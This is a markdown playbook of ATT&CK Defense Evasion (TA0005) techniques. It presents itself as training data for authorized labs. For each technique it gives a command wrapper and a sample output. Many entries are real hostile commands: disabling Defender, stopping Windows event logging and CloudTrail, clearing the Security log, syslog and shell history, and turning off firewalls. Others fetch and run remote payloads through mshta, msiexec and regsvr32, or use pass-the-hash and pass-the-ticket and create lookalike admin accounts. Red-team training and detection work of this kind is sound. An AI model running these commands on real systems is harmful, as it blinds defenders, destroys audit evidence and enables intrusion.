# Defense Evasion Enumeration Playbook (ATT&CK TA0005, Dataset-Ready)

> Purpose: provide realistic, high-value command and tooling examples for Defense Evasion training data.
> Scope: authorized lab and sanctioned exercises only.

Defense Evasion is the adversary tactic focused on avoiding detection during compromise.

- ATT&CK Tactic ID: TA0005
- Created: 17 October 2018
- Last Modified: 25 April 2025

---

## 0. Safety, Logging, and Lab Controls

1. Run only in approved environments.
2. Prefer benign markers (`ta0005_*`) over malware.
3. Log command + output + timestamp + analyst interpretation.
4. Revert all evasion changes after tests.

### 0.1 Evidence Wrapper

```bash
mkdir -p evidence

run_evasion() {
  local technique="$1"
  local label="$2"
  shift 2
  local ts
  ts="$(date -u +%Y%m%dT%H%M%SZ)"
  echo "[$ts] [$technique] $label" | tee -a evidence/defense_evasion.log
  "$@" 2>&1 | tee "evidence/${ts}_${technique}_${label}.txt"
}
```

### 0.2 Training Record Schema

```json
{
  "technique": "T1562.001",
  "technique_name": "Disable or Modify Tools",
  "scenario": "Operator disables endpoint control in a sandbox",
  "command": "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
  "tool_result": {"status":"success", "highlights":["RealtimeMonitoring: Disabled"]},
  "analyst_interpretation": "Security control state changed and must trigger tamper alert",
  "confidence": 0.96,
  "mitigation_hint": "Enable tamper protection and alert on policy changes"
}
```

---

## 1. High-Priority Deep Dives (Most Important)

## T1562 Impair Defenses

Scenario:
- Adversary attempts to disable preventive and detective controls before follow-on actions.

```bash
run_evasion "T1562" "defense_status_baseline" sh -lc 'echo "collect AV, logging, firewall, EDR states"'
```

Example result:

```text
Baseline captured: AV=enabled, EventLog=running, Firewall=on
```

### T1562.001 Disable or Modify Tools

```bash
run_evasion "T1562.001" "disable_defender_lab" powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpPreference | Select-Object DisableRealtimeMonitoring"
```

Example:

```text
DisableRealtimeMonitoring : True
```

### T1562.002 Disable Windows Event Logging

```bash
run_evasion "T1562.002" "eventlog_disable_lab" powershell -NoProfile -Command "Stop-Service EventLog -Force"
```

Example:

```text
WARNING: Service 'Windows Event Log' stopped
```

### T1562.003 Impair Command History Logging

```bash
run_evasion "T1562.003" "clear_ps_history" powershell -NoProfile -Command "Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue"
```

Example:

```text
PSReadLine history file removed
```

### T1562.004 Disable or Modify System Firewall

```bash
run_evasion "T1562.004" "disable_win_firewall" netsh advfirewall set allprofiles state off
```

Example:

```text
Ok.
```

### T1562.006 Indicator Blocking

```bash
run_evasion "T1562.006" "etw_block_sim" sh -lc 'echo "simulate ETW/telemetry blocking in lab"'
```

Example:

```text
Telemetry stream gap detected for process tree scope
```

### T1562.007 Disable or Modify Cloud Firewall

```bash
run_evasion "T1562.007" "aws_sg_widen_rule" aws ec2 authorize-security-group-ingress --group-id sg-123456 --protocol tcp --port 3389 --cidr 0.0.0.0/0
```

Example:

```text
SecurityGroupRuleId: sgr-0abc...
```

### T1562.008 Disable or Modify Cloud Logs

```bash
run_evasion "T1562.008" "stop_cloudtrail" aws cloudtrail stop-logging --name org-trail
```

Example:

```text
Logging stopped for trail: org-trail
```

### T1562.009 Safe Mode Boot

```bash
run_evasion "T1562.009" "set_safeboot" bcdedit /set {current} safeboot network
```

Example:

```text
The operation completed successfully.
```

### T1562.010 Downgrade Attack

```bash
run_evasion "T1562.010" "powershell_v2_sim" powershell -Version 2 -Command "Write-Output ta0005_downgrade"
```

Example:

```text
ta0005_downgrade
```

### T1562.011 Spoof Security Alerting

```bash
run_evasion "T1562.011" "spoof_alert_sim" sh -lc 'echo "simulate false-green security status injection"'
```

Example:

```text
Dashboard state mismatch: endpoint unhealthy while status feed reports healthy
```

### T1562.012 Disable or Modify Linux Audit System

```bash
run_evasion "T1562.012" "disable_auditd" sudo auditctl -e 0
```

Example:

```text
audit enabled 0
```

### T1562.013 Disable or Modify Network Device Firewall

```bash
run_evasion "T1562.013" "net_device_acl_change" ssh admin@edge-fw 'configure terminal ; no access-list 101 deny tcp any any eq 4444 ; end ; write memory'
```

Example:

```text
ACL 101 modified
Configuration saved
```

---

## T1070 Indicator Removal

Scenario:
- Adversary removes historical traces to limit investigation quality.

```bash
run_evasion "T1070" "cleanup_overview" sh -lc 'echo "simulate multi-source evidence cleanup"'
```

### T1070.001 Clear Windows Event Logs

```bash
run_evasion "T1070.001" "wevtutil_clear" wevtutil cl Security
```

Example: `The command completed successfully.`

### T1070.002 Clear Linux or Mac System Logs

```bash
run_evasion "T1070.002" "truncate_syslog" sudo sh -lc '> /var/log/syslog'
```

Example: `syslog size now 0 bytes`

### T1070.003 Clear Command History

```bash
run_evasion "T1070.003" "bash_history_clear" sh -lc 'history -c; rm -f ~/.bash_history'
```

Example: `history file removed`

### T1070.004 File Deletion

```bash
run_evasion "T1070.004" "delete_artifact" sh -lc 'rm -f /tmp/ta0005_payload.bin'
```

Example: `artifact removed`

### T1070.005 Network Share Connection Removal

```bash
run_evasion "T1070.005" "share_disconnect" net use \\fileserver\admin$ /delete
```

Example: `The network connection could not be found (or deleted).`

### T1070.006 Timestomp

```bash
run_evasion "T1070.006" "timestomp_touch" sh -lc 'touch -r /bin/ls /tmp/ta0005_payload.bin; stat /tmp/ta0005_payload.bin'
```

Example: `Modify time now matches /bin/ls`

### T1070.007 Clear Network Connection History and Configurations

```bash
run_evasion "T1070.007" "clear_recent_hosts_sim" sh -lc 'echo "simulate recent network artifacts cleanup"'
```

Example: `KnownHosts and resolver cache entries altered`

### T1070.008 Clear Mailbox Data

```bash
run_evasion "T1070.008" "mailbox_purge_sim" sh -lc 'echo "simulate mailbox item deletion by query"'
```

Example: `Items matching subject pattern removed`

### T1070.009 Clear Persistence

```bash
run_evasion "T1070.009" "remove_persist_mech" schtasks /delete /tn TA0003Demo /f
```

Example: `SUCCESS: The scheduled task "TA0003Demo" was successfully deleted.`

### T1070.010 Relocate Malware

```bash
run_evasion "T1070.010" "relocate_payload" sh -lc 'cp /tmp/a.bin /var/tmp/.cache.bin && rm -f /tmp/a.bin'
```

Example: `payload moved to alternate path`

## T1202 Indirect Command Execution

```bash
run_evasion "T1202" "forfiles_indirect_exec" cmd /c "forfiles /p C:\\Windows /m notepad.exe /c \"cmd /c echo ta0005_indirect\""
```

Example: `ta0005_indirect`

---

## T1036 Masquerading

```bash
run_evasion "T1036" "masquerade_overview" sh -lc 'echo "simulate artifact renaming/appearance evasion"'
```

### T1036.001 Invalid Code Signature

```bash
run_evasion "T1036.001" "invalid_sig_sim" sh -lc 'echo "simulate copied signature metadata mismatch"'
```

### T1036.002 Right-to-Left Override

```bash
run_evasion "T1036.002" "rtlo_name_sim" sh -lc 'printf "invoice\u202Ecod.scr\n"'
```

### T1036.003 Rename Legitimate Utilities

```bash
run_evasion "T1036.003" "rename_utility" cmd /c "copy C:\\Windows\\System32\\rundll32.exe C:\\Temp\\svchost32.exe"
```

### T1036.004 Masquerade Task or Service

```bash
run_evasion "T1036.004" "service_name_masking" sc create WindowsUpdateHelper binPath= "cmd /c echo ta0005_mask"
```

### T1036.005 Match Legitimate Resource Name or Location

```bash
run_evasion "T1036.005" "name_location_match" sh -lc 'cp payload /usr/lib/systemd/systemd-helper'
```

### T1036.006 Space after Filename

```bash
run_evasion "T1036.006" "space_suffix_sim" sh -lc 'echo "simulate filename with trailing space behavior"'
```

### T1036.007 Double File Extension

```bash
run_evasion "T1036.007" "double_ext_sim" sh -lc 'touch Report.pdf.exe && ls -l Report.pdf.exe'
```

### T1036.008 Masquerade File Type

```bash
run_evasion "T1036.008" "fake_header_sim" sh -lc 'echo "simulate file magic mismatch"'
```

### T1036.009 Break Process Trees

```bash
run_evasion "T1036.009" "ppid_break_sim" sh -lc 'echo "simulate detached child process"'
```

### T1036.010 Masquerade Account Name

```bash
run_evasion "T1036.010" "account_lookalike" net user adm1nistrator P@ssw0rd! /add
```

### T1036.011 Overwrite Process Arguments

```bash
run_evasion "T1036.011" "argv_overwrite_sim" sh -lc 'echo "simulate argv memory overwrite"'
```

### T1036.012 Browser Fingerprint

```bash
run_evasion "T1036.012" "ua_spoof" curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://example.com
```

---

## T1027 Obfuscated Files or Information

```bash
run_evasion "T1027" "obfuscation_overview" sh -lc 'echo "simulate payload obfuscation workflow"'
```

### T1027.001 Binary Padding

```bash
run_evasion "T1027.001" "binary_padding" sh -lc 'dd if=/dev/zero bs=1 count=4096 >> sample.bin'
```

### T1027.002 Software Packing

```bash
run_evasion "T1027.002" "pack_sim" sh -lc 'echo "simulate UPX/packer stage"'
```

### T1027.003 Steganography

```bash
run_evasion "T1027.003" "steg_sim" sh -lc 'echo "simulate hidden payload in image"'
```

### T1027.004 Compile After Delivery

```bash
run_evasion "T1027.004" "compile_after_delivery" sh -lc 'echo "int main(){return 0;}" > /tmp/a.c && gcc /tmp/a.c -o /tmp/a.out && /tmp/a.out; echo $?'
```

### T1027.005 Indicator Removal from Tools

```bash
run_evasion "T1027.005" "tool_string_change" sh -lc 'echo "simulate replacing known IoC strings in tool binary"'
```

### T1027.006 HTML Smuggling

```bash
run_evasion "T1027.006" "html_smuggle_sim" sh -lc 'echo "simulate JS Blob payload reconstruction"'
```

### T1027.007 Dynamic API Resolution

```bash
run_evasion "T1027.007" "dynamic_api_sim" sh -lc 'echo "simulate runtime LoadLibrary/GetProcAddress resolution"'
```

### T1027.008 Stripped Payloads

```bash
run_evasion "T1027.008" "strip_binary" sh -lc 'cp /bin/ls /tmp/ls_strip && strip /tmp/ls_strip && file /tmp/ls_strip'
```

### T1027.009 Embedded Payloads

```bash
run_evasion "T1027.009" "embedded_payload_sim" sh -lc 'echo "simulate payload appended to benign file"'
```

### T1027.010 Command Obfuscation

```bash
run_evasion "T1027.010" "cmd_obfuscation_sim" powershell -NoProfile -Command "&('Wh'+'oami')"
```

### T1027.011 Fileless Storage

```bash
run_evasion "T1027.011" "registry_storage_sim" reg add HKCU\\Software\\TA0005 /v blob /t REG_SZ /d dGFhMDAwNQ== /f
```

### T1027.012 LNK Icon Smuggling

```bash
run_evasion "T1027.012" "lnk_icon_smuggle_sim" sh -lc 'echo "simulate command hidden in LNK icon path"'
```

### T1027.013 Encrypted or Encoded File

```bash
run_evasion "T1027.013" "base64_encode" sh -lc 'echo ta0005_payload | base64'
```

### T1027.014 Polymorphic Code

```bash
run_evasion "T1027.014" "polymorph_sim" sh -lc 'echo "simulate per-run opcode mutation"'
```

### T1027.015 Compression

```bash
run_evasion "T1027.015" "compress_payload" sh -lc 'echo ta0005 > /tmp/p.txt && gzip -c /tmp/p.txt > /tmp/p.txt.gz && ls -l /tmp/p.txt*'
```

### T1027.016 Junk Code Insertion

```bash
run_evasion "T1027.016" "junk_code_sim" sh -lc 'echo "simulate dead-code insertion blocks"'
```

### T1027.017 SVG Smuggling

```bash
run_evasion "T1027.017" "svg_smuggle_sim" sh -lc 'echo "simulate script-enabled SVG payload"'
```

---

## T1055 Process Injection

```bash
run_evasion "T1055" "process_injection_overview" sh -lc 'echo "simulate memory injection pattern"'
```

### T1055.001 Dynamic-link Library Injection

```bash
run_evasion "T1055.001" "dll_injection_sim" sh -lc 'echo "simulate remote thread + LoadLibrary"'
```

### T1055.002 Portable Executable Injection

```bash
run_evasion "T1055.002" "pe_injection_sim" sh -lc 'echo "simulate PE mapping into remote process"'
```

### T1055.003 Thread Execution Hijacking

```bash
run_evasion "T1055.003" "thread_hijack_sim" sh -lc 'echo "simulate suspend/modify/resume thread"'
```

### T1055.004 Asynchronous Procedure Call

```bash
run_evasion "T1055.004" "apc_injection_sim" sh -lc 'echo "simulate APC queue shellcode execution"'
```

### T1055.005 Thread Local Storage

```bash
run_evasion "T1055.005" "tls_injection_sim" sh -lc 'echo "simulate TLS callback injection"'
```

### T1055.008 Ptrace System Calls

```bash
run_evasion "T1055.008" "ptrace_injection_sim" sh -lc 'echo "simulate ptrace attach + write + continue"'
```

### T1055.009 Proc Memory

```bash
run_evasion "T1055.009" "proc_mem_sim" sh -lc 'echo "simulate /proc/<pid>/mem injection"'
```

### T1055.011 Extra Window Memory Injection

```bash
run_evasion "T1055.011" "ewm_injection_sim" sh -lc 'echo "simulate SetWindowLongPtr code redirection"'
```

### T1055.012 Process Hollowing

```bash
run_evasion "T1055.012" "process_hollowing_sim" sh -lc 'echo "simulate suspended process image replacement"'
```

### T1055.013 Process Doppelganging

```bash
run_evasion "T1055.013" "doppelganging_sim" sh -lc 'echo "simulate TxF-backed process doppelganging"'
```

### T1055.014 VDSO Hijacking

```bash
run_evasion "T1055.014" "vdso_hijack_sim" sh -lc 'echo "simulate vDSO hook path"'
```

### T1055.015 ListPlanting

```bash
run_evasion "T1055.015" "listplanting_sim" sh -lc 'echo "simulate list-view callback abuse"'
```

---

## 2. Broad Technique Command Matrix (Accurate Quick Examples)

## T1548 Abuse Elevation Control Mechanism

### T1548.001 Setuid and Setgid
`find / -perm -4000 -type f 2>/dev/null`

### T1548.002 Bypass User Account Control
`fodhelper.exe` abuse simulation via lab registry key setup.

### T1548.003 Sudo and Sudo Caching
`sudo -l && sudo -k && sudo -v`

### T1548.004 Elevated Execution with Prompt
`osascript -e 'do shell script "id" with administrator privileges'`

### T1548.005 Temporary Elevated Cloud Access
`aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin --role-session-name ta0005`

### T1548.006 TCC Manipulation
`sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db '.tables'`

## T1134 Access Token Manipulation

### T1134.001 Token Impersonation or Theft
Use `Invoke-TokenManipulation` style lab simulation.

### T1134.002 Create Process with Token
`runas /user:corp\admin cmd`

### T1134.003 Make and Impersonate Token
Logon token simulation via `LogonUser` test harness.

### T1134.004 Parent PID Spoofing
CreateProcess PPID-spoof simulation binary in lab.

### T1134.005 SID-History Injection
AD lab script simulating SIDHistory assignment audit event.

## T1197 BITS Jobs
`bitsadmin /create ta0005job && bitsadmin /addfile ta0005job https://example.com/a.bin C:\\ProgramData\\a.bin && bitsadmin /resume ta0005job`

## T1612 Build Image on Host
`docker build -t ta0005/local .`

## T1622 Debugger Evasion
`if (IsDebuggerPresent()) exit(0)` style simulation output.

## T1678 Delay Execution
`sleep 600` / `Start-Sleep -Seconds 600` / delayed task chain.

## T1140 Deobfuscate or Decode Files or Information
`base64 -d payload.b64 > payload.bin`

## T1610 Deploy Container
`kubectl run ta0005 --image=alpine -- sh -c 'id'`

## T1006 Direct Volume Access
`powershell -Command "Get-ChildItem \\.\\C:"` (lab-safe read test)

## T1484 Domain or Tenant Policy Modification

### T1484.001 Group Policy Modification
`Set-GPRegistryValue` in test domain GPO.

### T1484.002 Trust Modification
`Get-ADTrust` baseline + `Set-ADTrust` simulation.

## T1672 Email Spoofing
SMTP lab relay simulation with forged `From` header.

## T1480 Execution Guardrails

### T1480.001 Environmental Keying
Decrypt only if domain/hostname matches expected value.

### T1480.002 Mutual Exclusion
`CreateMutex("Global\\ta0005_mutex")` simulation.

## T1211 Exploitation for Defense Evasion
Exploit chain simulation focused on bypassing EDR hook layer.

## T1222 File and Directory Permissions Modification

### T1222.001 Windows File and Directory Permissions Modification
`icacls C:\\Sensitive /grant Everyone:F`

### T1222.002 Linux and Mac File and Directory Permissions Modification
`chmod 777 /tmp/ta0005_dir`

## T1564 Hide Artifacts

### T1564.001 Hidden Files and Directories
`attrib +h secret.txt` / `mv payload .payload`

### T1564.002 Hidden Users
Hidden account UID<500 or registry user list manipulation simulation.

### T1564.003 Hidden Window
PowerShell `-WindowStyle Hidden`.

### T1564.004 NTFS File Attributes
`type payload.exe > normal.txt:payload.exe`

### T1564.005 Hidden File System
Hidden partition or mounted container simulation.

### T1564.006 Run Virtual Instance
`qemu-system-x86_64 ...` / hidden VM job simulation.

### T1564.007 VBA Stomping
VBA source replaced while p-code remains simulation.

### T1564.008 Email Hiding Rules
`New-InboxRule -Name hide -MoveToFolder JunkEmail`

### T1564.009 Resource Forking
`xattr -wx com.apple.ResourceFork ... file`

### T1564.010 Process Argument Spoofing
In-memory argv overwrite simulation.

### T1564.011 Ignore Process Interrupts
`nohup ./agent &`

### T1564.012 File or Path Exclusions
`Add-MpPreference -ExclusionPath C:\\Temp\\Trusted`

### T1564.013 Bind Mounts
`mount --bind /malicious /usr/local/bin/helper`

### T1564.014 Extended Attributes
`setfattr -n user.note -v ta0005 /tmp/a`

## T1574 Hijack Execution Flow

### T1574.001 DLL
DLL search-order hijack simulation.

### T1574.004 Dylib Hijacking
`DYLD_INSERT_LIBRARIES=/tmp/lib.dylib ./app`

### T1574.005 Executable Installer File Permissions Weakness
Writable installer path replacement simulation.

### T1574.006 Dynamic Linker Hijacking
`LD_PRELOAD=/tmp/libhook.so target_bin`

### T1574.007 Path Interception by PATH Environment Variable
`export PATH=/tmp:$PATH`

### T1574.008 Path Interception by Search Order Hijacking
Drop fake binary in earlier searched directory.

### T1574.009 Path Interception by Unquoted Path
Unquoted service path exploitation simulation.

### T1574.010 Services File Permissions Weakness
Replace writable service binary in lab.

### T1574.011 Services Registry Permissions Weakness
Modify service ImagePath registry value.

### T1574.012 COR_PROFILER
Set `COR_ENABLE_PROFILING=1` and `COR_PROFILER={GUID}`.

### T1574.013 KernelCallbackTable
PEB callback pointer tamper simulation.

### T1574.014 AppDomainManager
Set AppDomainManager assembly config in .NET app domain.

## T1656 Impersonation
`swaks --server smtp.lab.local --from ceo@corp.local --to analyst@corp.local --header "Subject: Payroll Review" --body "Please review attached report"`

## T1556 Modify Authentication Process

### T1556.001 Domain Controller Authentication
DC auth routine patch simulation.

### T1556.002 Password Filter DLL
`HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages`

### T1556.003 Pluggable Authentication Modules
`/etc/pam.d/` stack modification simulation.

### T1556.004 Network Device Authentication
Patched device image hardcoded credential simulation.

### T1556.005 Reversible Encryption
Enable reversible encryption policy in AD lab.

### T1556.006 Multi-Factor Authentication
Conditional policy disable simulation.

### T1556.007 Hybrid Identity
Federation/sync rule tampering simulation.

### T1556.008 Network Provider DLL
Network provider order + DLL registration simulation.

### T1556.009 Conditional Access Policies
Add exclusion for privileged account in CA policy simulation.

## T1578 Modify Cloud Compute Infrastructure

### T1578.001 Create Snapshot
`aws ec2 create-snapshot --volume-id vol-123`

### T1578.002 Create Cloud Instance
`aws ec2 run-instances --image-id ami-123 --count 1`

### T1578.003 Delete Cloud Instance
`aws ec2 terminate-instances --instance-ids i-123`

### T1578.004 Revert Cloud Instance
Restore snapshot / replace root volume simulation.

### T1578.005 Modify Cloud Compute Configurations
Increase service quota / adjust policy simulation.

## T1666 Modify Cloud Resource Hierarchy
Modify org/folder/project assignment simulation in cloud IAM tree.

## T1112 Modify Registry
`reg add HKCU\\Software\\TA0005 /v Test /t REG_SZ /d 1 /f`

## T1601 Modify System Image

### T1601.001 Patch System Image
Network OS image patch simulation.

### T1601.002 Downgrade System Image
Install older network firmware image simulation.

## T1599 Network Boundary Bridging

### T1599.001 Network Address Translation Traversal
NAT rule insertion simulation on perimeter device.

## T1647 Plist File Modification
`defaults write com.apple.someapp key value`

## T1542 Pre-OS Boot

### T1542.001 System Firmware
UEFI variable tampering simulation.

### T1542.002 Component Firmware
Peripheral firmware replacement simulation.

### T1542.003 Bootkit
Bootloader hook simulation in lab VM.

### T1542.004 ROMMONkit
ROMMON image load simulation on network device lab.

### T1542.005 TFTP Boot
Network boot from rogue TFTP source simulation.

## T1620 Reflective Code Loading
In-memory PE/DLL reflective loader simulation.

## T1207 Rogue Domain Controller
DCShadow registration simulation in test AD forest.

## T1014 Rootkit
Kernel/user mode hook simulation with benign marker.

## T1679 Selective Exclusion
Ransomware-lab simulator excludes `.dll .exe .lnk` patterns.

## T1553 Subvert Trust Controls

### T1553.001 Gatekeeper Bypass
`xattr -d com.apple.quarantine sample.app`

### T1553.002 Code Signing
Use stolen/created cert simulation to sign sample binary.

### T1553.003 SIP and Trust Provider Hijacking
WinVerifyTrust provider hijack simulation.

### T1553.004 Install Root Certificate
`certutil -addstore root test_ca.cer`

### T1553.005 Mark-of-the-Web Bypass
Archive/unblock path simulation removing Zone.Identifier.

### T1553.006 Code Signing Policy Modification
Policy to allow unsigned scripts simulation.

## T1218 System Binary Proxy Execution

### T1218.001 Compiled HTML File
`hh.exe ta0005.chm`

### T1218.002 Control Panel
`control.exe /name Microsoft.WindowsFirewall`

### T1218.003 CMSTP
`cmstp.exe /s ta0005.inf`

### T1218.004 InstallUtil
`InstallUtil.exe /U ta0005.dll`

### T1218.005 Mshta
`mshta.exe https://example.com/a.hta`

### T1218.007 Msiexec
`msiexec /i https://example.com/a.msi /qn`

### T1218.008 Odbcconf
`odbcconf.exe /a {REGSVR ta0005.dll}`

### T1218.009 Regsvcs or Regasm
`regasm.exe ta0005.dll`

### T1218.010 Regsvr32
`regsvr32 /s /n /u /i:https://example.com/a.sct scrobj.dll`

### T1218.011 Rundll32
`rundll32.exe ta0005.dll,EntryPoint`

### T1218.012 Verclsid
`verclsid.exe /S /C {CLSID}`

### T1218.013 Mavinject
`mavinject.exe <pid> /INJECTRUNNING ta0005.dll`

### T1218.014 MMC
`mmc.exe ta0005.msc`

### T1218.015 Electron Applications
Electron preload abuse simulation.

## T1216 System Script Proxy Execution

### T1216.001 PubPrn
`cscript.exe %windir%\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs ...`

### T1216.002 SyncAppvPublishingServer
`SyncAppvPublishingServer.vbs "n; powershell -enc ..."`

## T1221 Template Injection
OOXML template relationship injection simulation.

## T1205 Traffic Signaling

### T1205.001 Port Knocking
`knock target 1111 2222 3333`

### T1205.002 Socket Filters
libpcap trigger filter simulation.

## T1127 Trusted Developer Utilities Proxy Execution

### T1127.001 MSBuild
`MSBuild.exe ta0005.xml`

### T1127.002 ClickOnce
Launch `.application` payload simulation.

### T1127.003 JamPlus
`jam -f ta0005.jam`

## T1535 Unused or Unsupported Cloud Regions
`aws ec2 run-instances --image-id ami-123456 --count 1 --region af-south-1`

## T1550 Use Alternate Authentication Material

### T1550.001 Application Access Token
`curl -H "Authorization: Bearer ${TOKEN}" https://api.lab.local/v1/profile`

### T1550.002 Pass the Hash
`impacket-psexec corp.local/user@dc01 -hashes :<NTHASH>`

### T1550.003 Pass the Ticket
`Rubeus.exe ptt /ticket:doIF...`

### T1550.004 Web Session Cookie
`curl -H "Cookie: session=<stolen_cookie>" https://portal.lab.local/account`

## T1078 Valid Accounts

### T1078.001 Default Accounts
`ssh root@10.10.10.20`

### T1078.002 Domain Accounts
`runas /user:CORP\\svc_backup cmd`

### T1078.003 Local Accounts
`net use \\10.10.10.15\\c$ /user:Administrator <password>`

### T1078.004 Cloud Accounts
`aws sts get-caller-identity --profile compromised-user`

## T1497 Virtualization or Sandbox Evasion

### T1497.001 System Checks
VM artifact checks (`VBox`, `VMware`, MAC OUI) simulation.

### T1497.002 User Activity Based Checks
Mouse/keyboard activity gating simulation.

### T1497.003 Time Based Checks
Sleep-skipping and uptime threshold checks simulation.

## T1600 Weaken Encryption

### T1600.001 Reduce Key Space
Weak cipher downgrade simulation on network device.

### T1600.002 Disable Crypto Hardware
Hardware crypto offload disable simulation.

## T1220 XSL Script Processing
`wmic process get brief /format:"https://example.com/ta0005.xsl"` simulation.

---

## 3. Coverage Checklist (Requested IDs)

Included IDs in this playbook:

- T1548, T1548.001, T1548.002, T1548.003, T1548.004, T1548.005, T1548.006
- T1134, T1134.001, T1134.002, T1134.003, T1134.004, T1134.005
- T1197, T1612, T1622, T1678, T1140, T1610, T1006
- T1484, T1484.001, T1484.002
- T1672
- T1480, T1480.001, T1480.002
- T1211
- T1222, T1222.001, T1222.002
- T1564, T1564.001, T1564.002, T1564.003, T1564.004, T1564.005, T1564.006, T1564.007, T1564.008, T1564.009, T1564.010, T1564.011, T1564.012, T1564.013, T1564.014
- T1574, T1574.001, T1574.004, T1574.005, T1574.006, T1574.007, T1574.008, T1574.009, T1574.010, T1574.011, T1574.012, T1574.013, T1574.014
- T1562, T1562.001, T1562.002, T1562.003, T1562.004, T1562.006, T1562.007, T1562.008, T1562.009, T1562.010, T1562.011, T1562.012, T1562.013
- T1656
- T1070, T1070.001, T1070.002, T1070.003, T1070.004, T1070.005, T1070.006, T1070.007, T1070.008, T1070.009, T1070.010
- T1202
- T1036, T1036.001, T1036.002, T1036.003, T1036.004, T1036.005, T1036.006, T1036.007, T1036.008, T1036.009, T1036.010, T1036.011, T1036.012
- T1556, T1556.001, T1556.002, T1556.003, T1556.004, T1556.005, T1556.006, T1556.007, T1556.008, T1556.009
- T1578, T1578.001, T1578.002, T1578.003, T1578.004, T1578.005
- T1666
- T1112
- T1601, T1601.001, T1601.002
- T1599, T1599.001
- T1027, T1027.001, T1027.002, T1027.003, T1027.004, T1027.005, T1027.006, T1027.007, T1027.008, T1027.009, T1027.010, T1027.011, T1027.012, T1027.013, T1027.014, T1027.015, T1027.016, T1027.017
- T1647
- T1542, T1542.001, T1542.002, T1542.003, T1542.004, T1542.005
- T1055, T1055.001, T1055.002, T1055.003, T1055.004, T1055.005, T1055.008, T1055.009, T1055.011, T1055.012, T1055.013, T1055.014, T1055.015
- T1620
- T1207
- T1014
- T1679
- T1553, T1553.001, T1553.002, T1553.003, T1553.004, T1553.005, T1553.006
- T1218, T1218.001, T1218.002, T1218.003, T1218.004, T1218.005, T1218.007, T1218.008, T1218.009, T1218.010, T1218.011, T1218.012, T1218.013, T1218.014, T1218.015
- T1216, T1216.001, T1216.002
- T1221
- T1205, T1205.001, T1205.002
- T1127, T1127.001, T1127.002, T1127.003
- T1535
- T1550, T1550.001, T1550.002, T1550.003, T1550.004
- T1078, T1078.001, T1078.002, T1078.003, T1078.004
- T1497, T1497.001, T1497.002, T1497.003
- T1600, T1600.001, T1600.002
- T1220

This playbook intentionally prioritizes high-impact evasion paths with deeper command coverage while still providing broad command examples across the full TA0005 list.
